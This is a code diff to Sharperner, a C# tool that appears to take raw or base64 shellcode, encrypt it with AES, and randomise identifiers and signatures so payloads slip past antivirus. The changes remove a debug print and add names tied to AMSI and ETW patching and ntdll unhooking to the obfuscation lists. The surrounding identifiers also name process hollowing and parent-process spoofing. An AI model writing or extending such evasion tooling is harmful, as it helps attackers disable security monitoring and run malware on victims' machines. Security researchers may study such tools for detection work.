@@ -759,7 +759,6 @@ Sharperner.exe /convert:file.exe
                             {
                                 Console.WriteLine("[+] Raw payload detected.");
                                 rawSh3lLc0d3 = File.ReadAllBytes(filePath);
-                                Console.WriteLine(rawSh3lLc0d3.Length);
                                 aesEncByte = AESEncrypt(rawSh3lLc0d3, aes_key, aes_iv);
                             }
                             else if (IsBase64String(File.ReadAllText(filePath)))
@@ -1135,7 +1134,8 @@ Sharperner.exe /convert:file.exe
                             //randomize variable names
                             string[] variableNames = { "morsed", "sh3llc0de", "decoded", "b64a3skey", "b64a3siv", "morsedb64a3skey", "morsedb64a3siv", "morsedxorKey", "xorKey",
                                                 "x0rek3y", "ciphertext", "recovered", "policy", "explorer_handle", "hollow_bin", "pid", "bytesWritten", "p_size", "overwrite",
-                                                "translated", "lines", "delim", "ascii_to_morse", "tokenize", "translate_morse", "get_PPID", "howlow_sc", "patchETW", "patchAMSI", "amsiPatch", "amsiAddr", "amsiAddr_bk", "etwAddr", "etwPatch", "patchAMSIOpenSession"};
+                                                "translated", "lines", "delim", "ascii_to_morse", "tokenize", "translate_morse", "get_PPID", "howlow_sc", "patchETW", "patchAMSI", "amsiPatch", "amsiAddr", "amsiAddr_bk", "etwAddr", "etwPatch", "patchAMSIOpenSession", "ntdllModule", "ntdllBase", "ntdllFile", "ntdllMapping", "ntdllMappingAddress", "hookedDosHeader", "hookedNtHeader",
+                                                "hookedSectionHeader", "unhook"};
 
                             foreach (string variableName in variableNames)
                             {
@@ -1518,7 +1518,7 @@ Sharperner.exe /convert:file.exe
                                         string[] signatures = { "morsedb64string", "b64string", "bufferByteArray", "deCompByteArray", "MapMap", "Menyeluruh", "PanggilMapPEMod", "GetPeMetaData", "GetNativeExportAddress",
                                                     "GetExportAddress", "GetLoadedModuleAddress", "GetLibraryAddress", "LoadModuleFromDisk", "DynamicAPIInvoke", "AllocateBytesToMemory", "RelocateModule",
                                                     "RewriteModuleIAT", "SetModuleSectionPermissions", "MapThisToMemory", "MapModuleToMemory", "DLLName", "FunctionName", "PeHeader", "OptHeaderSize", "OptHeader",
-                                                    "Magic", "pExport", "ExportRVA", "OrdinalBase", "NumberOfFunctions", "NumberOfNames", "FunctionsRVA", "NamesRVA", "OrdinalsRVA"};
+                                                    "Magic", "pExport", "ExportRVA", "OrdinalBase", "NumberOfFunctions", "NumberOfNames", "FunctionsRVA", "NamesRVA", "OrdinalsRVA", "AmsiPatch"};
 
                                         foreach (string signature in signatures)
                                         {
